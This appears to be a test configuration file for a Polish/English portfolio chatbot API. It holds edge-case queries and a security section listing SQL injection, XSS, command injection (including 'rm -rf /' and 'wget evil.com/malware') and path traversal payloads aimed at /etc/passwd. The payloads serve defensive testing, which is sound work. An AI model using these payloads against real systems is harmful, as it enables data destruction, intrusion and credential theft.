export const TEST_CONFIG = {
  API_BASE_URL: process.env.TEST_API_URL || 'http://localhost:3000',
  TIMEOUT: 30000,
  MAX_RETRIES: 3,
  CONCURRENT_LIMIT: 50,
  
  ENDPOINTS: {
    CHAT: '/api/ai/chat',
    CHAT_LLM: '/api/ai/chat-with-llm',
    CHAT_STREAMING: '/api/ai/chat-streaming',
    INTELLIGENT_CHAT: '/api/ai/intelligent-chat',
    TEST_CHAT: '/api/test-chat',
  },
  
  TEST_CATEGORIES: {
    SMOKE: ['basic functionality'],
    EDGE: ['extreme cases', 'edge cases'],
    PERFORMANCE: ['load', 'stress', 'concurrency'],
    SECURITY: ['injection', 'xss', 'rate limiting'],
    INTEGRATION: ['rag pipeline', 'context management'],
  },

  // Test data sets
  EXTREME_LANGUAGE_CASES: [
    // Mixed languages
    "Hello, jakie masz umiejętności in English?",
    "Привет, tell me about projektach на русском",
    "Hola, ¿qué projekty tienes en español?",
    "Bonjour, quelles sont vos compétences?",
    "Guten Tag, welche Fähigkeiten haben Sie?",
    "こんにちは、どんなスキルがありますか？",
    "你好，你有什么技能？",
    "مرحبا، ما هي مهاراتك؟",
    
    // Dialects and slang
    "Yo, co tam z tymi skillsami bracie?",
    "Ey koleś, gadaj co robisz",
    "Siema ziomek, jakie masz doświadczenie?",
    "Sup dude, what can you do?",
    "What's good bro, tell me bout your skills",
    "Wassup man, what you about?",
    
    // Special characters and emojis
    "🚀 Jakie masz umiejętności? 🎯",
    "💻 Tell me about your skills 🔥",
    "⚡ Co potrafisz zrobić? ⭐",
    "🎨 Design skills? 🖼️",
    "🤖 AI expertise? 🧠",
    "📱 Mobile development? 💡",
    
    // Case variations
    "JAKIE MASZ UMIEJĘTNOŚCI???",
    "what skills do you have",
    "WhaT ProJectS dO YoU HaVe?",
    "jAkIe MaSz DoŚwIaDcZeNiE?",
    "TELL ME ABOUT YOUR EXPERIENCE!!!",
    
    // Accented characters
    "Jakie masz ûmîęjętnöści???",
    "What @#$% skills do you have?",
    "Co rob!sz w pr@cy?",
    "Qué habilidades tienes tú?",
    "Quelles compétences avez-vous?",
    "Welche Fähigkeiten besitzen Sie?",
  ],

  EXTREME_TECHNICAL_CASES: [
    // Very long queries
    "A".repeat(1000) + " jakie masz umiejętności?",
    "B".repeat(5000) + " tell me about your projects",
    "C".repeat(10000) + " what can you do?",
    
    // Very short queries
    "?",
    "a",
    "co",
    "hi",
    "yo",
    ".",
    "!",
    
    // Special characters only
    "!@#$%^&*()",
    "😀😃😄😁😆😊😇😍",
    "🔥💻⚡🎯🚀💡🎨🖼️",
    "◊◊◊◊◊◊◊◊◊◊",
    "░▒▓█▓▒░",
    "⌘⌥⇧⌃",
    
    // Code as questions
    "console.log('jakie masz umiejętności')",
    "SELECT * FROM skills WHERE user='eryk'",
    "import { skills } from './eryk'",
    "function getSkills() { return 'what skills?'; }",
    "const skills = ['what', 'can', 'you', 'do'];",
    "<script>alert('skills')</script>",
    
    // Data formats
    '{"question": "jakie masz umiejętności"}',
    "<question>Co potrafisz?</question>",
    "skills: [design, programming, leadership]",
    "skills=design&programming&leadership",
    "query=skills&format=json",
    
    // Escape characters
    "Jakie masz\\numiejętności\\t?",
    "What\\rskills\\ndo\\tyou\\rhave?",
    "Co\\x20potrafisz\\x20zrobić?",
    "Skills\\u0020list\\u0020please",
    
    // Null/undefined/boolean
    "null",
    "undefined",
    "true",
    "false",
    "NaN",
    "Infinity",
    "-Infinity",
    
    // Numbers and dates
    "12345678901234567890",
    "0",
    "-1",
    "3.14159",
    "2023-01-01T00:00:00Z",
    "1677721600000",
    
    // URLs and paths
    "https://example.com/skills",
    "file:///etc/passwd",
    "ftp://user:pass@server.com",
    "/api/ai/chat",
    "../../etc/passwd",
    
    // Base64 and encoded
    "c2tpbGxz", // "skills" in base64
    "%73%6B%69%6C%6C%73", // "skills" URL encoded
    "&#115;&#107;&#105;&#108;&#108;&#115;", // "skills" HTML encoded
  ],

  EXTREME_CONTEXT_CASES: [
    // No context questions
    "Dlaczego?",
    "Jak?",
    "Kiedy?",
    "Gdzie?",
    "Co z tym?",
    "Why?",
    "How?",
    "When?",
    "Where?",
    "What about it?",
    
    // Ambiguous questions
    "To jest dobre?",
    "Czy to działa?",
    "Ile to kosztuje?",
    "Is this good?",
    "Does it work?",
    "How much does it cost?",
    "Is it worth it?",
    "Should I do it?",
    
    // Philosophical questions
    "Jaki jest sens życia?",
    "Czy sztuczna inteligencja ma duszę?",
    "Co to znaczy być człowiekiem?",
    "What is the meaning of life?",
    "Do AIs have souls?",
    "What does it mean to be human?",
    "Is consciousness real?",
    "Are we living in a simulation?",
    
    // Personal questions
    "Ile zarabiasz?",
    "Masz dziewczynę?",
    "Gdzie mieszkasz?",
    "How much do you make?",
    "Do you have a girlfriend?",
    "Where do you live?",
    "What's your password?",
    "Are you single?",
    
    // Provocative questions
    "Jesteś głupi?",
    "Nie wierzę ci",
    "To nieprawda",
    "Are you stupid?",
    "I don't believe you",
    "That's not true",
    "You're lying",
    "Prove it",
    
    // Meta questions
    "Czym jesteś?",
    "Jak działasz?",
    "Kto cię stworzył?",
    "What are you?",
    "How do you work?",
    "Who created you?",
    "Are you real?",
    "Can you think?",
  ],

  EXTREME_CHAOS_CASES: [
    // Spam/repetitions
    "jakie jakie jakie jakie masz umiejętności?",
    "skills skills skills skills skills",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "hahahahahahahahahahahahaha",
    "lol lol lol lol lol lol lol",
    "test test test test test test",
    
    // Random words
    "banana komputer słoń javascript",
    "random words elephant programming",
    "kot pies samochód reaktor",
    "pizza unicorn rainbow database",
    "cheese mountain flying spaghetti",
    "purple monkey dishwasher quantum",
    
    // Gibberish
    "asdfghjkl qwertyuiop zxcvbnm",
    "fjdklsajf kldsajflkdsaj flkdsajf",
    "blahblahblah yaddayadda hoohah",
    "fumblerooski whatzitcalled thingamajig",
    "ksjdhfkjshdf kjshdfkjshd",
    "xyzqwerty asdfghjkl poiuytrewq",
    
    // Boolean chaos
    "true false true false true",
    "yes no maybe so perhaps",
    "tak nie może być definitely",
    "oui non peut-être certainement",
    "si no quizás definitivamente",
    
    // Number sequences
    "1 2 3 4 5 6 7 8 9 10",
    "0 1 1 2 3 5 8 13 21 34", // Fibonacci
    "2 4 6 8 10 12 14 16 18",
    "1 4 9 16 25 36 49 64 81", // Squares
    
    // Multiple questions
    "Who? What? When? Where? Why? How?",
    "Co? Jak? Kiedy? Gdzie? Dlaczego?",
    "Qué? Cómo? Cuándo? Dónde? Por qué?",
    "Quoi? Comment? Quand? Où? Pourquoi?",
    "Was? Wie? Wann? Wo? Warum?",
    
    // Contradictory statements
    "You are great and terrible",
    "I love you and hate you",
    "This is true and false",
    "Yes and no simultaneously",
    "Maybe definitely perhaps",
    "Absolutely not sure",
  ],

  // Performance test parameters
  PERFORMANCE_PARAMS: {
    LIGHT_LOAD: 10,
    MEDIUM_LOAD: 50,
    HEAVY_LOAD: 100,
    EXTREME_LOAD: 200,
    
    TIMEOUT_SHORT: 5000,
    TIMEOUT_MEDIUM: 15000,
    TIMEOUT_LONG: 30000,
    
    ACCEPTABLE_RESPONSE_TIME: 5000,
    ACCEPTABLE_FAILURE_RATE: 0.05, // 5%
    
    MEMORY_LEAK_THRESHOLD: 100 * 1024 * 1024, // 100MB
  },

  // Security test parameters
  SECURITY_PARAMS: {
    SQL_INJECTIONS: [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; SELECT * FROM secrets; --",
      "UNION SELECT password FROM users",
      "' OR 1=1 --",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM users)) --",
    ],
    
    XSS_ATTACKS: [
      "<script>alert('xss')</script>",
      "javascript:alert('xss')",
      "<img src=x onerror=alert('xss')>",
      "';alert('xss');//",
      "<svg onload=alert('xss')>",
      "<iframe src=javascript:alert('xss')>",
      "<body onload=alert('xss')>",
    ],
    
    COMMAND_INJECTIONS: [
      "; cat /etc/passwd",
      "| ls -la",
      "&& rm -rf /",
      "; wget evil.com/malware",
      "` cat /etc/passwd `",
      "$( cat /etc/passwd )",
      "${cat /etc/passwd}",
    ],
    
    PATH_TRAVERSALS: [
      "../../etc/passwd",
      "../../../windows/system32/config/sam",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..\\..\\..\\etc\\passwd",
    ],
  },

  // Language test parameters
  LANGUAGE_PARAMS: {
    SUPPORTED_LANGUAGES: ['polish', 'english'],
    UNSUPPORTED_LANGUAGES: ['spanish', 'german', 'russian', 'chinese', 'japanese', 'arabic'],
    
    LANGUAGE_DETECTION_TESTS: [
      { lang: 'Polish', query: 'Jakie masz umiejętności?', expectPolish: true },
      { lang: 'English', query: 'What skills do you have?', expectEnglish: true },
      { lang: 'Spanish', query: '¿Qué habilidades tienes?', expectFallback: true },
      { lang: 'German', query: 'Welche Fähigkeiten haben Sie?', expectFallback: true },
      { lang: 'Russian', query: 'Какие у вас навыки?', expectFallback: true },
      { lang: 'Chinese', query: '你有什么技能？', expectFallback: true },
      { lang: 'Japanese', query: 'どんなスキルがありますか？', expectFallback: true },
      { lang: 'Arabic', query: 'ما هي مهاراتك؟', expectFallback: true },
    ],
  },
};

// Export individual test case arrays for easier access
export const {
  EXTREME_LANGUAGE_CASES,
  EXTREME_TECHNICAL_CASES,
  EXTREME_CONTEXT_CASES,
  EXTREME_CHAOS_CASES,
  PERFORMANCE_PARAMS,
  SECURITY_PARAMS,
  LANGUAGE_PARAMS,
} = TEST_CONFIG;